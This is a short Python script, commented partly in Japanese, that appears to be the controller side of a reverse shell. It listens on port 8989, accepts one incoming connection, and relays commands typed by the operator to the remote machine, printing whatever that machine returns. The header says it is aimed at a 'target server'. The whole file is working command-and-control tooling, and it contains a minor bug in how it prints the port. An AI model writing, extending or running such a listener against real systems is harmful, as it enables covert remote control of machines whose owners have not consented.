#author: Johnjimy Som
#date: 2018年8月24日
#version: 1.0.0
#objective: ターゲットサーバのみ. お願いいたします！

import socket
import sys

def socket_create():
    try: 
        global host 
        global port 
        global s
        host = ''
        port = 8989 #共通ポート（テスト用）を使用しないでください。
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " +str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(3)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "retrying.. its prolly your fault lol")
        print("Socket binding error: " + str(msg) + "\n" + "check if you have your port: " + str(port) + "on still lol.")
        print("Socket binding error: " + str(msg) + "\n" + "try turning your terminal off and on.. lol")
        socket_bind() 

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established |" + "IP: " + address[0] + " | Port: " + str(address[0]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8") #レスポンスをバイト単位で受け取ると、文字列に変換する必要があります。 buffer1024
            print(client_response,'\n') #'\n' or (pip3 ->)end="" 最後に新しい行の文字を与えないでください

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()

#debug
#input()
print(sys.version) #Pythonであなたのバージョンを確認する